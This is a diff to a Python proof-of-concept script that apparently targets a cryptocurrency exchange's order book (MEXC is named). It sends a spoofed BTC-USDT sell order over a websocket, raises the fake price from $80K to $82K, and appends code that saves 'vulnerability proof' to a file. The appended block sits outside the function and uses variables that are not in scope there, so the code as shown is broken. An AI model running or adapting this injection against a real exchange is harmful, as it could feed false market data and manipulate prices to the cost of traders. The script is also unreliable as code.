@@ -24,13 +24,13 @@ async def verify_orderbook_vulnerability():
                 "op": "update",
                 "args": [{
                     "symbol": "BTC-USDT",
-                    "price": "80000.00",  # Clearly unrealistic price
+                    "price": "82000.00",  # Clearly unrealistic price
                     "quantity": "100",
                     "side": "sell"
                 }]
             }
             await ws.send(json.dumps(spoofed_data))
-            print("🟡 Step 4: Injected spoofed order (BTC 100@$80K)")
+            print("🟡 Step 4: Injected spoofed order (BTC 100@$82K)")
             
             # Step 5: Verify impact
             try:
@@ -46,3 +46,9 @@ async def verify_orderbook_vulnerability():
         print(f"🔴 Critical error: {str(e)}")
 
 asyncio.run(verify_orderbook_vulnerability())
+
+# Add this to your script after Step 5 to capture full session:
+with open("mexc_proof.txt", "w") as f:
+    f.write(f"VULNERABILITY PROOF - {datetime.now()}\n")
+    f.write(f"Injected: {spoofed_data}\n")
+    f.write(f"Server Response: {response}\n")
